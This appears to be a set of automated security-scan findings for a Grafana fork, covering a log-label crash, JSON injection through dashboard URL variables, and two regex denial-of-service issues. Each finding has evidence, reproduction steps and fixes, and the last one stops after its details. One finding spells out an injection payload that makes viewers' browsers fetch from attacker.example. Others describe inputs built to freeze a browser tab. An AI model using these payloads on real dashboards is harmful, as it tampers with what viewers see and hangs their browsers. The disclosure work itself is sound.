**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256419

---

# TemplateSrv treats any scopedVars.__sceneObject as a SceneObject; log label of that name crashes link rendering

## Details
TemplateSrv.replace (public/app/features/templating/template_srv.ts:269-280) uses the presence of a `__sceneObject` key in scopedVars as the signal that the caller is a scenes object and, without any type check, evaluates `scopedVars.__sceneObject.value.valueOf()` and passes the result to sceneGraph.interpolate as the SceneObject to resolve variables against. Scenes code populates that key with a SafeSerializableSceneObject; nothing prevents other callers from putting data-derived keys there.

getFieldLinksForExplore (public/app/features/explore/utils/links.ts:143-161) does exactly that: for dataplane log frames it copies every label of the current row into scopedVars under the label's own name, and for every frame it copies every field name as a key. Label names are chosen by whoever produces the log stream or line (stream labels and structured metadata at ingestion, or `| json` / `| logfmt`-extracted keys that Loki returns as labels when the viewer's query uses such a parser); field names are chosen by the datasource. A row carrying a label named `__sceneObject` therefore yields scopedVars.__sceneObject = { value: '<label value>' }. getVariableUsageInfo(link, allVars) (line 196; 317-334) then runs getTemplateSrv().replace over every string of each configured data link; replace() takes the scenes branch, `'<label value>'.valueOf()` is the string itself, and sceneGraph.interpolate is invoked with a string as the scene object. For the first variable token in the link that is not itself a truthy scopedVars key (anything such as `${__url_time_range}`, `${__from}`, `${__to}`, `${__org.name}` or a dashboard variable — common in external data links), recovered @grafana/scenes lookupVariable or the time macros dereference `sceneObject.state`, which is undefined for a string, and a TypeError escapes replace(). A null label value (possible from a malicious datasource) throws even earlier at `.value.valueOf()`. Links that reference only row-scoped variables (e.g. a plain Loki derived field using `${__value.raw}`) do not reach the faulty dereference, so a link whose strings contain a non-row variable is a precondition (AT:PRESENT).

The exception is raised inside React render on passive viewing: LogLine.tsx:496 renders log.highlightedBodyTokens whenever syntax highlighting is on (the default, LogList.tsx:176), that getter calls generateLogGrammar (grammar.ts:36-38), which reads LogListModel.fields (processing.ts:180-185) → getAllFields → getDataframeFields (logParser.ts:69-91) → getFieldLinks. The same happens when log details are opened (LogLineDetailsComponent.tsx:64). In Explore the 'explore-logs-panel' error boundary replaces the whole logs result for that query with an error alert; in a dashboard Logs panel the scenes VizPanelRenderer error boundary replaces the panel. The condition is deterministic and recurs for every user whose result set contains such a row while a qualifying link is configured, so a log producer (who needs no Grafana account) can make the logs view unusable for all viewers of that stream and time range. A malicious datasource could also trigger it, but that position gains nothing beyond what returning an error response already gives it; the position of consequence is the log producer.

The same mechanism lets a label named `__value` or `__data` shadow the built-in row context used by link templates, but that only changes link content the log producer already influences through field values.

Root cause: a privileged sentinel key is looked up in a map that callers fill from untrusted names, and the value is used as a SceneObject without verifying its type. Assumptions stated from recovered sources: @grafana/scenes sceneInterpolator/lookupVariable/timeMacros behave as in public/build/7606.e8e4d98948a4bb1cf3bc.js.map (the version bundled with this 13.2.4 build); the bundled Loki plugin returns stream, structured-metadata and parser-extracted labels in the dataplane `labels` field (plugin not read; its ELF/minified build is out of scope).

## Evidence
1. [public/app/features/templating/template\_srv.ts:269–279](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/templating/template_srv.ts#L269-L279)
   replace() takes the scenes branch whenever scopedVars has a truthy __sceneObject key and calls scopedVars.__sceneObject.value.valueOf() with no instanceof/shape check, then hands the result to sceneGraph.interpolate as the SceneObject. A caller whose scopedVars keys come from data can therefore supply a plain string (or null, which throws here directly). This is the line the fix must change.
2. [public/app/features/explore/utils/links.ts:143–160](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/utils/links.ts#L143-L160)
   For DataFrameType.LogLines frames getFieldLinksForExplore copies every label of the current row (Object.entries(labels[rowIndex]) from parseDataplaneLogsFrame().getLogFrameLabels(), raw label values) and then every field name into scopedVars as scopedVars[name] = { value }. Label names are chosen by the log producer/datasource, so a label literally named __sceneObject lands on the key template_srv.ts:270 trusts; __value and __data set earlier (lines 110-140) can be shadowed the same way.
3. [public/app/features/explore/utils/links.ts:196–209](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/utils/links.ts#L196-L209)
   The poisoned scopedVars reach getVariableUsageInfo(link, allVars) (defined at 317-334), which runs getTemplateSrv().replace over the concatenation of every string in the link, and the replace wrapper handed to getDataLinkUIModel. The only filter before this (DATA_LINK_FILTERS, line 45) is a permissions check and does not interpolate.
4. [public/build/7606.e8e4d98948a4bb1cf3bc.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/7606.e8e4d98948a4bb1cf3bc.js.map) (whole file)
   Recovered @grafana/scenes sources: sceneInterpolator.lookupFormatVariable returns a ScopedVarsVariable only for names present and truthy in scopedVars; for any other `$name`/`${name}` it calls lookupVariable(name, sceneObject), whose first statement is `sceneObject.state.$variables`. Time macros (UrlTimeRangeMacro, TimeFromAndToMacro) call getTimeRange(sceneObject), which also reads sceneObject.state. With a string in place of the SceneObject, `.state` is undefined and a TypeError escapes replace(). sceneGraph.interpolate itself only short-circuits on an empty target.
5. [public/app/features/logs/components/panel/processing.ts:180–193](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/processing.ts#L180-L193)
   LogListModel.fields lazily computes getAllFields(this, this._getFieldLinks); highlightedBody / highlightedBodyTokens (lines 187-208) call generateLogGrammar(this) while rendering the line body, which reads this.fields. The exception is therefore thrown during React render of the line itself, not only when details are opened.
6. [public/app/features/logs/components/panel/grammar.ts:36–37](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/grammar.ts#L36-L37)
   generateLogGrammar reads log.fields.map(field => field.keys[0]) to build the label grammar, so computing the Prism grammar for a line forces the links computation for every visible field of that row.
7. [public/app/features/logs/components/panel/LogLine.tsx:496](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/LogLine.tsx#L496)
   LogLineBody renders <HighlightedLogRenderer tokens={log.highlightedBodyTokens} /> whenever syntaxHighlighting is on, which is the default (LogList.tsx:176 store.getBool(..., true); LogListContext.tsx:107 syntaxHighlighting: true). Viewing the list is enough; no click on the row is required (UI:PASSIVE). The TypeError propagates to the Explore 'explore-logs-panel' ErrorBoundaryAlert (Explore.tsx:783) or, in dashboards, to the ErrorBoundaryAlert in scenes VizPanelRenderer.
8. [public/app/features/logs/components/logParser.ts:69–90](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/logParser.ts#L69-L90)
   getDataframeFields calls getFieldLinks(field, rowIndex, dataFrame, vars) for every non-empty visible field of the row, with no try/catch, so the TypeError propagates out to the caller in processing.ts.
9. [public/app/features/explore/Logs/LogsContainer.tsx:226–227](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/Logs/LogsContainer.tsx#L226-L227)
   Production caller in Explore: getFieldLinks passes dataFrame to getFieldLinksForExplore, so row labels and field names are copied into scopedVars.
10. [public/app/plugins/panel/logs/LogsPanel.tsx:328–338](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/logs/LogsPanel.tsx#L328-L338)
   Production caller in the dashboard Logs panel with the same shape; the scene is active there but template_srv.ts:270 still takes the scopedVars.__sceneObject branch first, so the label value replaces the real SceneObject.

## Impact
Deterministic client-side exception caught by the Explore logs error boundary or the dashboard panel error boundary: the logs result / panel is replaced by an error alert for every viewer whose query returns the offending row, for as long as it is in range. No data disclosure or modification, server unaffected, recoverable by changing the query or time range. Availability LOW.

## Reproduction steps
1. An attacker who can write log lines or stream labels into a Loki (or any dataplane-logs) datasource that Grafana users browse — no Grafana privileges needed — emits a row with a label named __sceneObject (as a stream label, structured metadata, or a JSON/logfmt key that the viewer's `| json` / `| logfmt` query extracts). Any user who views that result in Explore or a dashboard Logs panel where a data link / derived field / correlation is configured with a template referencing a variable not supplied per row (e.g. ${__url_time_range}, ${__from}, a dashboard variable) triggers the TypeError during passive rendering of the line (syntax highlighting on by default) or on opening row details. Requires such a link configuration (AT:PRESENT); the victim only views logs (UI:PASSIVE); nothing validates the label name or the type of scopedVars.__sceneObject.

## Recommended fix
1. template_srv.ts replace() trusts any truthy scopedVars.__sceneObject and dereferences it as a SceneObject without checking its type. Fix criteria: The scenes branch must only be taken when the value is actually a SceneObject/SafeSerializableSceneObject (instance or shape check), otherwise fall through to the normal path; a scopedVars entry {__sceneObject: {value: 'x'}} must not throw and must interpolate like any other scoped variable.
2. getFieldLinksForExplore copies datasource-chosen label and field names into the same namespace as reserved keys (__sceneObject, __value, __data). Fix criteria: Data-derived names must not be able to overwrite reserved/built-in keys (skip names starting with __ or write them under a nested key); a log row with labels __sceneObject/__value/__data renders its links without error and without altering built-in macro values.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper input validation
**CWE:** [CWE-1287](https://cwe.mitre.org/data/definitions/1287.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256415

---

# URL variable values injected into transformation JSON let a link author add arbitrary transformations

## Details
Scenes dashboards interpolate template variables into panel transformations by serializing the whole `transformations` array to JSON text, running variable interpolation over that text, and parsing the result back (recovered @grafana/scenes SceneDataTransformer._interpolateVariablesInTransformationConfigs, public/build/7606.e8e4d98948a4bb1cf3bc.js.map, lines 250-264). The default Glob format inserts the variable value verbatim (String(value)). JSON.stringify escapes the author's strings but the value is inserted afterwards, so any value containing `"` closes the string literal the author placed the variable in and the rest of the value is parsed as JSON structure. Because the array is interpolated as a single document, the injected text can close the current transformation object and append new ones; the attacker only has to balance the closing braces for the nesting depth of the referenced option (a handful of candidates), which a link author can do blind or by reading the dashboard JSON.

Variable values are controlled by whoever authors a link: scenes UrlSyncManager builds URLSearchParams(location.search) and hands var-<name> to updateFromUrl; TextBoxVariable.updateFromUrl stores any string, and MultiValueUrlSyncHandler.updateFromUrl does the same for custom/query variables, marking skipNextValidation so a value that is not among the options is kept. Grafana enables this URL sync on every dashboard page (DashboardScenePage.tsx:159, PublicDashboardScenePage.tsx:73) and wraps every panel's saved transformations in SceneDataTransformer (createPanelDataProvider.ts:40-43), so the round-trip runs for every viewer. No Grafana-side code filters var-* values (pages/utils.ts:53 and dashboardSessionState.ts:38 filter only keys).

Precondition: the dashboard references a variable anywhere in a transformation option (e.g. organize.renameByName, filterByValue value, a field name). The reference does not have to be in a regex field; any string option suffices.

Attack: for a dashboard whose transformation contains "$x" at depth array>object>options>renameByName, an unauthenticated attacker sends a viewer /d/<uid>?var-x=<payload> where the payload is, for example, `"}}},{"id":"fieldLookup","options":{"lookupField":"host","gazetteer":"https://attacker.example/g.json","p":{"q":"` (the original tail `"}}}]` then completes the document). After JSON.parse the viewer's panel pipeline contains an attacker-chosen `fieldLookup` transformation: recovered @grafana/data transformDataFrame.getOperator resolves any registered id and, under Scenes, runs it with the options as-is; fieldLookup.ts:31 passes options.gazetteer to getGazetteer(), which does fetch(path) (gazetteer.ts:226), parses the response and merges its fields into the panel data. The attacker thereby (a) makes the victim's browser request an arbitrary URL on dashboard load with no click (same-origin requests carry the session cookie; the response is rendered in the panel), (b) chooses the data the victim sees (any transformer id and options: calculateField, organize, filterByValue, convertFieldType, ... can drop, rename or recompute fields), and (c) reaches every regex-compiling transformer (renameByRegex, filterFieldsByName, extractFields, filterByValue regex) regardless of whether the author used a variable in a regex option, which widens the precondition of the recorded ReDoS finding transformations-variable-interpolated-regex-redos (that record notes option-key injection in passing; this record is about the structural injection as its own weakness and the transformer-level sinks it opens). Authoring the transformation pipeline is otherwise an Editor capability; a link author gains it against every viewer of the dashboard.

The legacy runner path (transformDataFrame with ctx.interpolate per string, used when window.__grafanaSceneContext is unset) interpolates each option string separately and is not affected; this is specific to the scenes dashboard path, which is the production path in 13.x.

Assumptions on uninstalled dependencies, stated from recovered sources (no package manifest is present in this distribution snapshot): @grafana/scenes SceneDataTransformer, UrlSyncManager, TextBoxVariable, MultiValueVariable, VariableDependencyConfig and the Glob formatter behave as in public/build/7606.e8e4d98948a4bb1cf3bc.js.map; @grafana/data transformDataFrame executes transformer ids from the standard registry as in public/build/6540.a30454ce5fbe65a84f5f.js.map.

## Evidence
1. [public/build/7606.e8e4d98948a4bb1cf3bc.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/7606.e8e4d98948a4bb1cf3bc.js.map) (whole file)
   Recovered @grafana/scenes querying/SceneDataTransformer.js:250-264 `_interpolateVariablesInTransformationConfigs`: when every transformation is an object it returns JSON.parse(sceneGraph.interpolate(this, JSON.stringify(transformations), scopedVars)). Variable values are spliced into the serialized JSON text after JSON.stringify has escaped the author's strings, so a value containing an unescaped double quote terminates the author's string literal and the remainder of the value is parsed as JSON structure (new keys, new objects in the array). VariableDependencyConfig.extractVariablesFrom (variables/VariableDependencyConfig.js:101-113) stringifies the whole transformations array, so a reference nested anywhere in options triggers the round-trip; `transform()` calls it on every data update and on every referenced-variable change (onReferencedVariableValueChanged → reprocessTransformations).
2. [public/build/7606.e8e4d98948a4bb1cf3bc.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/7606.e8e4d98948a4bb1cf3bc.js.map) (whole file)
   Recovered @grafana/scenes variables/interpolation/sceneInterpolator.js:68-69 defaults to VariableFormatID.Glob when no format is given; formatRegistry.js:255-267 Glob formatter returns String(value) with no escaping. services/UrlSyncManager.js:190-200 UrlParamsCache builds URLSearchParams(location.search) and services/utils.js:35-57 syncUrlStateToObject passes urlParams.getAll('var-<name>') to updateFromUrl; variants/TextBoxVariable.js:41-46 stores any string, variants/MultiValueVariable.js:317-331 calls changeValueTo(urlValue) for custom/query variables and sets skipNextValidation so a value absent from the option list survives validation (interceptStateUpdateAfterValidation, 111-118).
3. [public/app/features/dashboard-scene/utils/createPanelDataProvider.ts:40–43](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/utils/createPanelDataProvider.ts#L40-L43)
   Every dashboard panel with queries gets its saved `panel.transformations` wrapped in a scenes SceneDataTransformer, so the JSON round-trip above runs in production for all viewers of the dashboard.
4. [public/app/features/dashboard-scene/pages/DashboardScenePage.tsx:159](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePage.tsx#L159)
   The production dashboard page wraps the scene in UrlSyncContextProvider, so the var-<name> query parameters of the opened link are synced into the variables before and while transformations run (PublicDashboardScenePage.tsx:73 does the same for public dashboards).
5. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   Recovered @grafana/data packages/grafana-data/src/transformations/transformDataFrame.ts:47-85 getOperator: for each config object it looks up standardTransformersRegistry.getIfExists(config.id) and runs transformation.operator({...defaultOptions, ...config.options}); when window.__grafanaSceneContext is set (Scenes) the options are used as-is, so an injected transformation object with any registered id executes with attacker-chosen options.
6. [public/app/features/transformers/standardTransformers.tsx:485](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/standardTransformers.tsx#L485)
   fieldLookup is registered in the standard transformer registry (as are renameByRegex, filterFieldsByName, extractFields, filterByValue, organize, calculateField), so an injected object with id 'fieldLookup' resolves to fieldLookupTransformer.
7. [public/app/features/transformers/lookupGazetteer/fieldLookup.ts:28–31](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/lookupGazetteer/fieldLookup.ts#L28-L31)
   One of the transformers the injected JSON can add: `fieldLookup` passes options.gazetteer straight to getGazetteer(), so an injected transformation object chooses the URL.
8. [public/app/features/geo/gazetteer/gazetteer.ts:210–240](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/geo/gazetteer/gazetteer.ts#L210-L240)
   getGazetteer() does fetch(path) on the supplied string (only a legacy 'public/gazetteer/' prefix is rewritten), parses the response as JSON and turns it into a frame whose values are merged into the panel data, so the injected transformation makes the viewer's browser fetch an attacker-chosen URL on dashboard load and display attacker-chosen values.
9. [public/app/features/templating/template\_srv.ts:270–290](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/templating/template_srv.ts#L270-L290)
   Grafana's TemplateSrv.replace delegates to sceneGraph.interpolate whenever a scene is active, so the scenes formatRegistry (not the legacy formatter) decides how values are inserted on the dashboard path.

## Impact
The attacker controls the client-side transformation pipeline of the victim's dashboard session, an Editor-level capability: panel data can be dropped, renamed or recomputed and replaced with values fetched from an attacker URL (integrity of what the victim sees, LOW, not persistent and confined to that session), and arbitrary transformers including the regex-compiling ones and a zero-click fetch of an arbitrary URL can be forced on load (availability LOW, in line with the recorded transformation ReDoS). The forced fetch leaks only that the victim opened the link (and its IP/referrer); no transformer sends panel data outward, so confidentiality is NONE. No server-side state changes.

## Reproduction steps
1. An unauthenticated attacker crafts /d/<uid>?var-<name>=<payload containing a double quote and brace-balanced JSON fragments> and gets any user who can view the dashboard to open it. Scenes UrlSyncManager hands the raw URLSearchParams value to TextBoxVariable/MultiValueUrlSyncHandler.updateFromUrl, which store the string; SceneDataTransformer interpolates it into the serialized transformations with Glob (String(value), no escaping) and JSON.parse accepts the altered structure, so the attacker's transformation objects run on the victim's panel data on load via transformDataFrame. Requires that the dashboard reference a variable inside some transformation option and that the attacker match the nesting depth of that option (AT:PRESENT); the attacker needs no privileges (PR:N) and the victim only opens the link (UI:P). Dependency behaviour is taken from the shipped source maps (public/build/7606.e8e4d98948a4bb1cf3bc.js.map, 6540.a30454ce5fbe65a84f5f.js.map).

## Recommended fix
Variable values are interpolated into serialized JSON text and parsed back, so untrusted values can change JSON structure instead of being confined to string content. Fix criteria: Interpolation must be applied to individual string values of the transformation config (or values must be JSON-escaped before insertion) so that a variable value can never alter the set of transformations, their ids or option keys. Verify that var-x=%22%7D%7D,%7B%22id%22:%22fieldLookup%22... yields a transformation whose option string literally contains that text and no additional transformation.

---
**Severity:** LOW
**Status:** Open
**Category:** JSON injection
**CWE:** [CWE-74](https://cwe.mitre.org/data/definitions/74.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256414

---

# Query variable numerical sort applies quadratic regex to every datasource-returned option label

## Details
When a dashboard query variable is saved with Sort = Numerical (ascending or descending), @grafana/scenes sorts the options returned by the datasource with `sortByNumeric`, which evaluates `opt.label.match(/.*?(\d+).*/)` once per option (recovered from public/build/7606.e8e4d98948a4bb1cf3bc.js.map, @grafana/scenes variables/variants/query/utils.js:106-116; called from sortVariableValues:78-83 and metricNamesToVariableValues:53, which QueryVariable.js:104-114 invokes on every variable refresh). The regex is unanchored and its body begins with a lazy `.*?` that must be followed by `\d+`: for a single-line label containing no digit, the backtracking engine tries every start position and at each one extends the lazy loop to the end of the string before failing, so one label of n characters costs on the order of n^2/2 steps. `.` stops only at line terminators, so a label made of ordinary letters is the worst case.

The label is the raw `text`/`value` of the variable query result, i.e. content returned by the datasource (adversary 4: a compromised or malicious upstream such as a Prometheus label-values endpoint, a SQL query result, or any plugin's metricFindQuery). scenes' `toMetricFindValues` copies the frame's string field values into {text,value} without any length check, and `metricNamesToVariableValues` only stringifies numbers, so nothing on the path truncates or validates option text. A single option whose text is a few hundred KB of non-digit characters (200 KB -> ~2e10 regex steps, tens of seconds to minutes of main-thread time) freezes the browser tab of every user who opens the dashboard, deterministically, on each variable refresh. The only precondition is the dashboard's Numerical sort setting, an ordinary option in the variable editor (QueryVariableSortSelect.tsx:31) commonly used to order ports, shards or instance numbers. Dashboards render through scenes unconditionally (DashboardPageProxy.tsx:12); the in-repo legacy copy at public/app/features/variables/query/reducer.ts:57 has the same regex and is reachable only through the legacy VariableQueryRunner.

Impact is confined to the victim's browser tab (client availability). Assumptions: the @grafana/scenes build bundled in this snapshot (version string not recoverable from the checkout) is what ships, as recovered from the chunk's source map; lodash `sortBy` evaluates the iteratee once per element; and the victim's browser RegExp engine is a backtracking engine without a linear-time fallback (V8/Irregexp with the experimental linear engine off, as Chrome and Firefox ship; JSC YARR), none of which special-case a leading lazy `.*?`.

## Evidence
1. [public/build/7606.e8e4d98948a4bb1cf3bc.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/7606.e8e4d98948a4bb1cf3bc.js.map) (whole file)
   Recovered sourcesContent webpack://grafana/./node_modules/@grafana/scenes/dist/esm/variables/variants/query/utils.js. `sortByNumeric(opt)` (106-116) runs `opt.label.match(/.*?(\d+).*/)`; `sortVariableValues` (67-105) uses it as the lodash sortBy iteratee for VariableSort.numericalAsc/numericalDesc (78-83); `metricNamesToVariableValues` (4-54) builds `label` from the raw `item.text ?? item.value` of every metricFindQuery result (18-25, only numbers are stringified) and calls sortVariableValues on the result (53). The pattern is unanchored, so the engine retries the body at every start position, and the body's leading lazy `.*?` must be followed by `\d+`: on a single-line label with no digit it extends to end of string at each start position before failing, i.e. about n^2/2 digit checks for a label of n characters. Only line terminators (which `.` does not match) bound the inner scan; nothing bounds label length.
2. [public/build/7606.e8e4d98948a4bb1cf3bc.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/7606.e8e4d98948a4bb1cf3bc.js.map) (whole file)
   @grafana/scenes variables/variants/query/QueryVariable.js: `runMetricFindForDatasource` (82-103) pipes the datasource's variable-query response through `toMetricFindValues()` (100), which copies the string/number field values of the returned frames into {text,value} with no length check (toMetricFindValues.js:5-39); `metricFindValuesToOptions` (104-114) then passes those values and `this.state.sort` to metricNamesToVariableValues. This runs on every variable refresh (dashboard load, time-range change per `refresh`) with no user action beyond opening the dashboard.
3. [public/app/features/dashboard-scene/utils/variables.ts:260–267](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/utils/variables.ts#L260-L267)
   `createSceneVariableFromVariableModel` builds the production `QueryVariable` from the saved dashboard variable with `sort: variable.sort` (267), so a dashboard saved with Sort = Numerical selects the sortByNumeric path. All dashboards render through scenes (public/app/features/dashboard/containers/DashboardPageProxy.tsx:12 returns DashboardScenePage unconditionally).
4. [public/app/features/variables/query/QueryVariableSortSelect.tsx:31](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/variables/query/QueryVariableSortSelect.tsx#L31)
   The variable editor offers `VariableSort.numericalAsc` (and the descending variant) as standard sort options; this select is rendered by the scenes QueryVariableEditor (dashboard-scene/settings/variables/editors/QueryVariableEditor/QueryVariableEditor.tsx:242), so the precondition is an ordinary dashboard setting, not a hidden configuration.
5. [public/app/features/variables/query/reducer.ts:50–61](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/variables/query/reducer.ts#L50-L61)
   The in-repo legacy variable reducer carries the identical `opt.text.match(/.*?(\d+).*/)` for sortType 2 (line 57). It is reached only through the legacy VariableQueryRunner (operators.ts -> updateVariableOptions; the runner is still registered in public/app/app.ts:269) while dashboards themselves render via scenes, so it is recorded as the sibling copy the fix must also cover rather than the primary production sink.

## Impact
Synchronous regex evaluation blocks the browser main thread for tens of seconds to minutes on every variable refresh, making the dashboard unusable for every viewer until the tab is killed; no confidentiality or integrity impact and the server is unaffected.

## Reproduction steps
1. A compromised or malicious datasource (or the network path to it) returns a variable-query option whose text is hundreds of KB of digit-free characters on one line. Any Grafana user who opens a dashboard whose query variable uses Numerical sort against that datasource has the regex executed on the main thread during variable refresh, with no interaction beyond loading the page (UI:P). The dashboard's sort setting is a precondition the attacker does not control (AT:P); no validation, truncation or time budget stands in the way, and the upstream needs no Grafana privileges.

## Recommended fix
1. `sortByNumeric` extracts the first number with an unanchored lazy-prefix regex (`.*?(\d+).*`) whose cost is quadratic in the length of datasource-controlled, digit-free label text. Fix criteria: Number extraction for numerical sort must be linear in label length (e.g. an anchored `^\D*(\d+)` or a plain `\d+` search, or a single forward scan) in both the @grafana/scenes copy and the legacy reducer; verify that a variable option of 1 MB of letters sorts without measurable delay.
2. Variable option text from metricFindQuery results is accepted at any length before sorting and rendering. Fix criteria: Bound or truncate option label/value length at toMetricFindValues / metricNamesToVariableValues so that per-option processing cannot be driven to multi-second cost by upstream content.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256411

---

# Prometheus plugin variable-placeholder regexes are quadratic on query text from Explore URL or dashboard

## Details
The bundled Prometheus datasource frontend (data/plugins-bundled/prometheus/module.js; source recovered from module.js.map) carries its own copy of Grafana's template-variable placeholder regexes, shared with the Loki plugin (verified finding loki-querybuilder-variable-regex-quadratic-redos): `querybuilder/parsingUtils.ts:33` `variableRegex` with `\[\[([\s\S]+?)(?::(\w+))?\]\]` and `:75` `returnVariables` with `/__V_(\d)__(.+?)__V__.../g`. Both are unanchored global scans whose lazy loop can only be terminated by a closing delimiter; when the input contains many openers and no closer, every opener position is tried and each attempt walks to end-of-string, i.e. ~n^2/2 regex steps for an n-byte expression of repeated `[` (or `__V_0__`). The lazy quantifier does not make the scan linear, because `String.replace` with a global regex retries at every position after each failed attempt; this settles the question left open for the Prometheus copy by earlier readers who judged it lazy/linear.

Reachable paths, all in shipped production code:

1. Explore link, unauthenticated attacker -> any logged-in user with Explore access. `/explore?panes=...` is JSON-parsed and the pane's `queries[].expr` copied verbatim (migrators/v1.ts:33,100-113; synchronizer/init.ts:43-57; queries without a datasource ref are kept and an unknown/missing datasource falls back to the last-used or default one). Explore's QueryEditorRow (public/app/features/query/components/QueryEditorRow.tsx:258) mounts the plugin's `PromQueryEditorByApp` -> `PromQueryEditorSelector`, which always renders `QueryPatternsModal`, whose `useMemo` calls `buildVisualQueryFromString(query.expr)` -> `replaceVariables(expr)` on first render (QueryPatternsModal.tsx:35-44, PromQueryEditorSelector.tsx:117-125), so simply opening the link blocks the tab for ~n^2/2 steps (100 KB of `[` is ~5e9 steps, tens of seconds; bounded only by the accepted request-line length). Builder mode (PromQueryBuilderContainer.tsx:36-44) and the Explain view repeat the work.

2. Dashboard, Editor -> every Viewer, no editor UI: `DataSourceWithBackend.query` (recovered @grafana/runtime, 6540.*.js.map DataSourceWithBackend.ts:201) calls `applyTemplateVariables(target, scopedVars, request.filters)` (datasource.ts:720-746) -> `enhanceExprWithAdHocFilters` -> `addLabelToQuery` -> `getVectorSelectorPositions` -> `buildVisualQueryFromString(substring of each VectorSelector)` (add_label_to_query.ts:44-57) on every query run whenever the dashboard has an ad-hoc filter variable bound to the Prometheus datasource with at least one filter. Because only VectorSelector substrings are parsed, the Editor places the payload inside a label-matcher string literal (`up{job="[[[[..."}`); the preceding core `templateSrv.replace` uses the linear `\[\[(\w+?)...` form and leaves it intact. No URL-length bound applies to a saved panel expression. `interpolateVariablesInQueries` (datasource.ts:611-630) reaches the same code.

3. `populateMatchParamsFromQueries` (language_provider.ts:446-460) parses every query's whole `expr` when the editor fetches metric metadata.

The effect is a deterministic main-thread hang of the victim's browser tab (client availability), triggered by one crafted input rather than volume; no length limit or complexity guard exists on either route. Assumptions: the browser's RegExp engine is a backtracking engine without a linear-time fallback (V8 Irregexp, SpiderMonkey, JavaScriptCore; V8's experimental linear fallback is off by default); on route 1 the reachable n is bounded by the request-line limit of the Go server (default 1 MiB, out of scope) or of a fronting reverse proxy (nginx's 8 KB default reduces it to a sub-second hang).

